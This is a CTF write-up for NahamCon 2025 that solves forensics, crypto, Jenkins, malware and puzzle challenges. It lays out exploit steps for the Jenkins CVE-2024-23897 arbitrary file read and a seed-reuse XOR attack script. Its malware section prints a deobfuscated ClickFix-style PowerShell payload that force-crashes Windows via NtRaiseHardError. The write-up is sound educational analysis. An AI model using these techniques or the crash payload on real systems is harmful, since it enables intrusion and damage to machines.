# Nahamcon CTF 2025 writeups

## Warmups

### Screenshot

![image](https://hackmd.io/_uploads/BkVh3BWfxe.png)

This challenge gave me a `Screenshot.png` that capturing the hex dump of file `flag.zip` in text editor.
So what I do is just represent the hex content of this file. In image, at offset `ef`, we saw that there no more bit, so it actually has full content.

![image](https://hackmd.io/_uploads/SJjAnrWfle.png)

Hex Content, saved in to `dump.hex`
```
504B03043300010063002F02B55A00000000430000002700000008000B00666C61672E74787401990700020041450300003D42FFD1B35F95031424F68B65C3F57669F14E8DF0003FE240B3AC3364859E4C2DBC3C36F2D4ACC403761385AFE4E3F90FBD29D91B614BA2C6EFDE11B71BCC907A72ED504B01023F033300010063002F02B55A00000000430000002700000008002F000000000000002080B48100000000666C61672E7478740A00200000000000010018008213854307CADB01000000000000000000000000000000000199070020004145030000504B0506000000000100010065000000740000000000

```

Convert hex text to binary file flag.txt

```bash
xxd -r -p dump.hex flag.zip
```

Then, unzip **flag.zip** with password `password`, open `flag.txt` and get the flag

`7z x -ppassword flag.zip`

![image](https://hackmd.io/_uploads/HyJzx8Zzle.png)

**FLAG: flag{907e5bb257cd5fc818e88a13622f3d46}**

### Free Flags!

![image](https://hackmd.io/_uploads/Sym9Infzgg.png)

This challenge gave me `free_flags.txt` file. It had a lot of flags, and **just one is real**.

![image](https://hackmd.io/_uploads/r1YVu3zMge.png)

So, in the rules of this competition, they noticed that flag will follow the format: **flag\{[0-9a-f]{32}\}**. That means a flag{} wrapper with a 32-character lowercase hex string inside.

In those flags, I just filter out the flag that follow that rules. The fake flags had none-hex character like uppercase char.

We can write a short script or just using AI to find it.

![image](https://hackmd.io/_uploads/r1tU9hffee.png)

**FLAG: flag{ae6b6fb0686ec594652afe9eb6088167}**

### Quartet

![image](https://hackmd.io/_uploads/H1djU3fzll.png)

This challenge gives me 4 file **.z01, .z02, .z03, .z04**. It looks like four plited parts of a file.

First check with HxD, I see that .z01 is first part of a **zip file** (Signature of zip file format `50 4B 07 08`)

![Screenshot 2025-05-27 110956](https://hackmd.io/_uploads/rkDJ3hfflx.png)

Solution is just concatenating 4 files into a zip file

```
cat quartet.z01 quartet.z02 quartet.z03 quartet.z04 > quartet.zip
```

I tried to unzip it like normal but something was corrupted. I checked the last file of it and saw that there was a **.jpeg** file.

![image](https://hackmd.io/_uploads/HkgA32fGgg.png)

The simplest way is using binwalk to extract all embedded content `binwalk -e quartet.zip`

![Screenshot 2025-05-27 111938](https://hackmd.io/_uploads/rk1s6nMGxl.jpg)

I got the `quartet.jpeg`. Using `strings` to get content and it shows the flag

![image](https://hackmd.io/_uploads/ByGvRnzfxe.png)

**FLAG: flag{8f667b09d0e821f4e14d59a8037eb376}**

## Crypto

### Cryptoclock

![image](https://hackmd.io/_uploads/rJ_a8nMGxe.png)

I got this `server.py`

```python!
#!/usr/bin/env python3
import socket
import threading
import time
import random
import os
from typing import Optional

def encrypt(data: bytes, key: bytes) -> bytes:
    """Encrypt data using XOR with the given key."""
    return bytes(a ^ b for a, b in zip(data, key))

def generate_key(length: int, seed: Optional[float] = None) -> bytes:
    """Generate a random key of given length using the provided seed."""
    if seed is not None:
        random.seed(int(seed))
    return bytes(random.randint(0, 255) for _ in range(length))

def handle_client(client_socket: socket.socket):
    """Handle individual client connections."""
    try:
        with open('flag.txt', 'rb') as f:
            flag = f.read().strip()
        
        current_time = int(time.time())
        key = generate_key(len(flag), current_time)
        
        encrypted_flag = encrypt(flag, key)
        
        welcome_msg = b"Welcome to Cryptoclock!\n"
        welcome_msg += b"The encrypted flag is: " + encrypted_flag.hex().encode() + b"\n"
        welcome_msg += b"Enter text to encrypt (or 'quit' to exit):\n"
        client_socket.send(welcome_msg)
        
        while True:
            data = client_socket.recv(1024).strip()
            if not data:
                break
                
            if data.lower() == b'quit':
                break
                
            key = generate_key(len(data), current_time)
            encrypted_data = encrypt(data, key)
            
            response = b"Encrypted: " + encrypted_data.hex().encode() + b"\n"
            client_socket.send(response)
            
    except Exception as e:
        print(f"Error handling client: {e}")
    finally:
        client_socket.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    server.bind(('0.0.0.0', 1337))
    server.listen(5)
    
    print("Server started on port 1337...")
    
    try:
        while True:
            client_socket, addr = server.accept()
            print(f"Accepted connection from {addr}")
            client_thread = threading.Thread(target=handle_client, args=(client_socket,))
            client_thread.start()
    except KeyboardInterrupt:
        print("\nShutting down server...")
    finally:
        server.close()

if __name__ == "__main__":
    main() 
```

The problem is server in the way server using seed for random()
`current_time = int(time.time())`, generate key from it `key = generate_key(len(flag), current_time)`. If we connect in one second, it will be same seed, same key. Key is used for both encrypt and decrypt by XOR, so we can exploit by step:
1. Receive encrypted flag
2. Send known plaintext
3. Receive encrypted plaintext
4. Calculate key by XOR plaintext with ciphertext.
5. XOR key with encrypted flag to get the flag

`solve_crytoclock.py`
```python!
#!/usr/bin/env python3
import socket

def xor_bytes(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))

def main():
    HOST = "challenge.nahamcon.com"
    PORT = 30675

    # 1) Mở kết nối và bọc thành file‐like để readline() dễ dùng
    s = socket.create_connection((HOST, PORT))
    f = s.makefile("rwb", newline=b"\n")

    # 2) Đọc cho tới khi gặp dòng encrypted flag
    enc_flag = None
    while True:
        line = f.readline().decode(errors="ignore")
        if not line:
            raise RuntimeError("Server closed kết nối trước khi gửi flag.")
        print(line, end="")                # in debug
        if line.startswith("The encrypted flag is:"):
            hexstr = line.split(":",1)[1].strip()
            enc_flag = bytes.fromhex(hexstr)
            break

    L = len(enc_flag)
    print(f"[+] Flag is {L} bytes long")

    # 3) Gửi payload độ dài bằng flag (ví dụ toàn 'A')
    payload = b"A" * L
    f.write(payload + b"\n")
    f.flush()

    # 4) Đọc về ciphertext của payload
    enc_payload = None
    while True:
        line = f.readline().decode(errors="ignore")
        if not line:
            raise RuntimeError("Server closed kết nối sau khi gửi payload.")
        print(line, end="")                # in debug
        if line.startswith("Encrypted:"):
            hexstr = line.split(":",1)[1].strip()
            enc_payload = bytes.fromhex(hexstr)
            break

    # 5) Tính key = enc_payload XOR payload
    key = xor_bytes(enc_payload, payload)

    # 6) Giải flag = enc_flag XOR key
    flag = xor_bytes(enc_flag, key)
    print("\n[+] Recovered flag:", flag.decode())

    # 7) Clean up
    f.write(b"quit\n")
    f.flush()
    s.close()

if __name__ == "__main__":
    main()

```

![image](https://hackmd.io/_uploads/ByFkQ6zfgx.png)

**FLAG: flag{0e42ba180089ce6e3bb50e52587d3724}**


## DevOps

### The Best Butler

![image](https://hackmd.io/_uploads/BJ4yw3fMxx.png)

This challenge is related to DevOps, it shows a Jenkin Dashboard

![image](https://hackmd.io/_uploads/rkjzdy7flg.png)

I saw that Jenkins version is 2.332.2. Research a little bit for CVE vulnerabilities associated with this version.

I found that something was related to path travesal in `CVE-2024-23897`

![image](https://hackmd.io/_uploads/HJ58FyQMgx.png)

This vulnerability is still existed in Jenkins core <= 2.441 and LTS <= 2.426.2, also Jenkins 2.332.2

**Description**: Jenkins uses the **args4j** library to parse command arguments and options on the Jenkins controller when processing CLI commands. This command parser has a feature that replaces an **@ character** followed by a file path in an argument with the file’s contents **(expandAtFiles)**

**Exploit:**

1. Download Jenkins CLI client

```
wget http://TARGET:PORT/jnlpJars/jenkins-cli.jar
```

![Screenshot 2025-05-24 123226](https://hackmd.io/_uploads/Sy2Ai17Mex.png)

2. Using `help/connect-node`, with `@<file>`. when putting `@/flag.txt`, the content in flag.txt is in one line, so it is used like an argument. Jenkins will tried to use that content for **help \[command]**, it will be not found and print
```
ERROR: Unknown command: flag{…} 
```

![Screenshot 2025-05-24 123238](https://hackmd.io/_uploads/S1Gk2kQzxg.png)

![Screenshot 2025-05-24 123250](https://hackmd.io/_uploads/BkJxnJ7zgl.png)

Details on how to exploit can be found at [HackTheBox](https://www.hackthebox.com/blog/cve-2024-23897) and the exploit code can be found at [Github](https://github.com/h4x0r-dz/CVE-2024-23897)

**FLAG: flag{ab63a76362c3972ac83d5cb8830fd51}**

## Malware

### Verification Clarification

![image](https://hackmd.io/_uploads/SkjxD2fzlg.png)

This challenge gives me a link to download zip file, but there is a **captcha that seems so weird**.

![Screenshot 2025-05-24 155533](https://hackmd.io/_uploads/Sk6F3J7zel.png)

Ya, I have seen this kind of captcha in the past - it's a kind of malware. 
Details is when we **click on** the verification square, a **powershell script will be saved in your clipboard**. If you open `Run` or other CLI, paste and run it, it will exploit your computer.

In this challenge, my clipboard had a script that bypass windows defender to run something from `captcha.zip/verify`

![Screenshot 2025-05-24 155721](https://hackmd.io/_uploads/SJgh_aJXfgl.png)

I tried to run it (in virtual machine), and it damaged my VM

![Screenshot 2025-05-24 161418](https://hackmd.io/_uploads/SJuyRyQflg.png)

So the `iex` pipeline may be the main cause. I just run the first command, add `-NoExit` to see what will be executed (skip iex).

Boom, the result is this command calling another command.

![Screenshot 2025-05-24 182836](https://hackmd.io/_uploads/B1WT0JXfee.png)

**Decode the base64 text.**

![image](https://hackmd.io/_uploads/B1IQ1gQGxg.png)

There is something about DNS resolve, using `dnslookup` to nameserver **5gmlw.pyrchdata.com** with type **TXT**

![image](https://hackmd.io/_uploads/SyrcklXzgg.png)

**Decode the base64 text.**

![Screenshot 2025-05-24 185110](https://hackmd.io/_uploads/H1n21x7Ggl.png)

It is another powershell that will execute the base64 text.
**Decode the base64 text and using Raw inflate**

![Screenshot 2025-05-24 185134](https://hackmd.io/_uploads/rJObxl7Mee.png)

Hmm, a kind of **obfuscation powershell**. In some characteres, it is written in reverse, and somes in the middle has concatenated with `'+'`. **Therefore, I wrote this command in reverse and remove concatenated strings**.

The main part looks like this:
```!
using System;using System.Runtime.InteropServices;public static class X{[DllImport(S6Rntdll.dllS6R)]public static extern uint RtlAdjustPrivilege(int P, bool E, bool T, out bool O);[DllImport(S6Rntdll.dllS6R)]public static extern uint NtRaiseHardError(uint E, uint N, uint U, IntPtr P, uint V, out uint R);public static unsafe void Shot(){bool t;uint r;RtlAdjustPrivilege(19, true, false, out t);NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out r);}}bTp;eZic=New-Object System.CodeDom.Compiler.CompilerParameters;eZic.CompilerOptions=bTp/unsafebTp;eZic.ReferencedAssemblies.Add(S6RSystem.dllS6R);eZia=Add-Type -TypeDefinition eZis -Language CSharp -PassThru -CompilerParameters eZic;[X]::Shot();iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(S6RW1N5c3RlbS5FbnZpcm9ubWVudF06OlNldEVudmlyb25tZW50VmFyaWFibGUoImZsYWciLCAiZmxhZ3s3Mzc0NTBhMjhmMzZlMWZkODA4ZTRlZDk5ZjJkODFlMH0iLCAiUHJvY2VzcyIpCg==S6R)))') -cReplAcE([CHAR]98+[CHAR]84+[CHAR]112),[CHAR]39 -REpLACE'S6R',[CHAR]34  -REpLACE  ([CHAR]101+[CHAR]90+[CHAR]105),[CHAR]36))
```

It has a base64 strings, remove `S6R` strings because of `-REpLACE'S6R'`. 
**Decode base64 strings.**

![Screenshot 2025-05-24 192058](https://hackmd.io/_uploads/SkyVbxQGel.png)

**FLAG: flag{737450a28f36e1fd808e4ed99f2d81e0}**

## Miscellaneous

### Flagdle

![image](https://hackmd.io/_uploads/SJOfD2GGel.png)

A website for playing **Worlde** (a popular game - guess words)

Based on How to Play, we need to:
- Send POST request to /guess
- Flag is 32 characters.
- 🟩 = correct pos, 🟨 = right char wrong pos, ⬛ = wrong char

![Screenshot 2025-05-24 150026](https://hackmd.io/_uploads/HkBv-lQzxe.png)

The main idea is that we just send from **1 to 9**, **a to f** with placeholders are alway-wrong chars **z** to find out exactly character in each place.

```python=
#!/usr/bin/env python3
import requests
import json
import time

URL = "http://challenge.nahamcon.com:31162/guess"

HEX_CHARS = "0123456789abcdef"
PLACEHOLDER = "z"   # ký tự không nằm trong set flag

def get_feedback(guess: str) -> str:
    """
    Gửi guess, nhận về chuỗi emoji trong JSON["result"].
    """
    headers = {"Content-Type": "application/json"}
    data = {"guess": guess}
    r = requests.post(URL, headers=headers, json=data)
    r.raise_for_status()
    return r.json()["result"]

def solve():
    # khởi tạo chuỗi flag body 32 ký tự (placeholder)
    body = [PLACEHOLDER] * 32

    for i in range(32):
        for c in HEX_CHARS:
            body[i] = c
            guess = "flag{" + "".join(body) + "}"
            fb = get_feedback(guess)

            # fb là một chuỗi unicode, mỗi ký tự 1 ô:
            # 🟩 = correct pos, 🟨 = right char wrong pos, ⬛ = wrong char
            if fb[i] == "🟩":
                print(f"Position {i}: found '{c}'")
                break
        else:
            raise RuntimeError(f"No hex char worked at pos {i}")
        # optional: sleep để tránh rate-limit
        time.sleep(0.1)

    flag = "flag{" + "".join(body) + "}"
    print("\n🎉 Recovered flag:", flag)

if __name__ == "__main__":
    solve()
```

![Screenshot 2025-05-24 150909](https://hackmd.io/_uploads/SJAz7gmMgx.png)

**FLAG: flag{bec42475a614b9c9ba80d0eb7ed258c5}**

### The Martian

![image](https://hackmd.io/_uploads/HJ37PhMzeg.png)

This challenge gave me a `challenge.martian` file. Extension `martian` is weird. 
Check this file with HxD to see the header of file signature and other information.

![Screenshot 2025-05-24 111017](https://hackmd.io/_uploads/S1ByNeQMll.png)

`MAR1` and `NahamConCTF` looked quite suspicious.

![Screenshot 2025-05-24 111055](https://hackmd.io/_uploads/B1XrVgQfee.png)

But in the end of the file, I found some text related to **jpg**. So there were some pictures embedding inside. 
Let's extract them with **binwalk**.

```bash
binwalk -e challenge.martian
```

There is a flag picture.

![image](https://hackmd.io/_uploads/rJ8vBlmMeg.png)

**FLAG: flag{0db031ac265b3e6538aff0d9f456004f}**

### I Want Pie

![image](https://hackmd.io/_uploads/BypEvhzGlg.png)

The challenge website has an **Upload** file button.

![Screenshot 2025-05-25 085721](https://hackmd.io/_uploads/BJ56rlQzle.png)

Read the description. It will lead to something **piet**, search it and know that it is a programming language

![Screenshot 2025-05-25 085810](https://hackmd.io/_uploads/HJpULx7zxl.png)

The desciption also tells us to print out **flag, oh my**, so the idea is upload the picture in piet language that can print **flag, oh my**

I use this - [piet_message_generator](https://github.com/sebbeobe/piet_message_generator) to create png that contain piet language.

```python
import numpy as np
from PIL import Image
import imageio

class Color(object):
	
	def __init__(self, color_table=None):
		if color_table is None:
			self.color_table = [1,0]
		else:
			self.color_table = color_table
			
	def RGB(self):
		if self.color_table[1] == 0:
			#Red
			if self.color_table[0] == 0:
				#Light
				return [255,192,192]
			elif self.color_table[0] == 1:
				#Normal
				return [255,0,0]
			elif self.color_table[0] == 2:
				#Dark
				return [192,0,0]
		elif self.color_table[1] == 1:
			#Yellow
			if self.color_table[0] == 0:
				#Light
				return [255,255,192]
			elif self.color_table[0] == 1:
				#Normal
				return [255,255,0]
			elif self.color_table[0] == 2:
				#Dark
				return [192,192,0]
		elif self.color_table[1] == 2:
			#Green
			if self.color_table[0] == 0:
				#Light
				return [192,255,192]
			elif self.color_table[0] == 1:
				#Normal
				return [0,255,0]
			elif self.color_table[0] == 2:
				#Dark
				return [0,192,0]
		elif self.color_table[1] == 3:
			#Cyan
			if self.color_table[0] == 0:
				#Light
				return [192,255,255]
			elif self.color_table[0] == 1:
				#Normal
				return [0,255,255]
			elif self.color_table[0] == 2:
				#Dark
				return [0,192,192]
		elif self.color_table[1] == 4:
			#Blue
			if self.color_table[0] == 0:
				#Light
				return [192,192,255]
			elif self.color_table[0] == 1:
				#Normal
				return [0,0,255]
			elif self.color_table[0] == 2:
				#Dark
				return [0,0,192]
		elif self.color_table[1] == 5:
			#Magenta
			if self.color_table[0] == 0:
				#Light
				return [255,192,255]
			elif self.color_table[0] == 1:
				#Normal
				return [255,0,255]
			elif self.color_table[0] == 2:
				#Dark
				return [192,0,192]

	def push_color(self):
		self.color_table[0] = (self.color_table[0] + 1) % 3
		return self.RGB()

	def write_color(self):
		self.color_table[0] = (self.color_table[0] + 2) % 3
		self.color_table[1] = (self.color_table[1] + 5) % 6
		return self.RGB()

current_color = Color()
piet_painting = []

def draw_block(size,num):
	block = np.zeros( (12,12,3), dtype=np.uint8 )	

	if num != 0:
		old_push_color = current_color.push_color()
		current_color.write_color()
		block[:,:] = current_color.RGB()
		block[0,0] = old_push_color
		size = size +1
	else:
		block[:,:] = current_color.RGB()
	
	pix_lft = 144-size
	div = pix_lft // 12
	rem = pix_lft % 12
	if div !=0:
		block[12-div:,]=0
	block[11-div:,:rem]=0

	pos_y = 12*num
	pos_x = 0
	piet_painting[pos_x:pos_x+12,pos_y:pos_y+12] = block

def draw_end(num):
	block = np.zeros( (12,5,3), dtype=np.uint8 )
	
	old_push_color = current_color.push_color()
	block[:,:] = 255
	block[0,0] = old_push_color
	block[0,1] = current_color.write_color()

	block[0:2,3] = 0
	block[1,1] = 0
	block[2,0] = 0
	block[2,4] = 0
	block[3,1:4] = 0
	block[2,1:4]=current_color.write_color()

	pos_y = 12*num
	pos_x = 0
	piet_painting[pos_x:pos_x+12,pos_y:pos_y+5] = block

#message = input("Write your message here: \n")
message = "flag, oh my"
painting_len = len(message)*12 + 5
piet_painting = np.zeros((12,painting_len,3), dtype=np.uint8)

i = 0
for char in message:
	draw_block(ord(char),i)
	i += 1
draw_end(i)

if painting_len < 390:
	plato_painting = imageio.v2.imread('Plato.png')
	plato_painting[0:12,0:painting_len] = piet_painting
	plato_img = Image.fromarray(plato_painting)
	imageio.imwrite('plato_code.png', plato_img)

img = Image.fromarray(piet_painting)
imageio.imwrite('piet_code_file.png', img)
```

Check with [npiet online](https://www.bertnase.de/npiet/npiet-execute.php), it prints out correct.

![image](https://hackmd.io/_uploads/S19Kde7zel.png)

![image](https://hackmd.io/_uploads/HyahdemMee.png)

I uploaded it, there was no flag, but it say something about **ppm**. Next, I converted `png` to `ppm` and then upload again. This time, I got the flag

![Screenshot 2025-05-25 085934](https://hackmd.io/_uploads/r17mYgQMel.png)

FLAG: flag{7deea6641b672696de44e60611a8a429}

### Cube

![image](https://hackmd.io/_uploads/r1jBDnzMex.png)

When I connected to this server, it is a game like escape from the room. This game is in **3D dimension with 6 ways (N, S, E, W, U, D)**. And the desciption told that **GO TO THE EDGES 1,17,...** - This maybe position of the flag

![Screenshot 2025-05-25 182320](https://hackmd.io/_uploads/SJnjtlmGgl.png)

I played it many times, checked Serial between normal room and trap room.

| Normal Serial | Trap Serial   |
|---------------|---------------|
|  318-118-691  |  154-032-**343**  |
|  901-219-909  |  **512**-760-**512**  |
|  042-756-414  |  **841**-243-884  |
|  218-878-543  |  381-032-**256**  |
|      ...      |      ...      |

Based on this table, the name of this challenge, the description, I found out that the rule of the game is that the **trap rooms are the rooms whose Serial contains square or cubed numbers**.

![Screenshot 2025-05-25 182339](https://hackmd.io/_uploads/By0BceXGxg.png)

Next, play! Try to go to **[1,17,...]** and then move **U/D**, avoid trap rooms until the flag room be found.
Should spam until spawning near [1, 17, ...] to reduce time to move.

It is in [1, 17, 11] with Serial **999-999-999**

![Screenshot 2025-05-25 182400](https://hackmd.io/_uploads/S1FL3emGll.png)

**FLAG: flag{4b7063c24950b524e559ef509ba7dc23}**









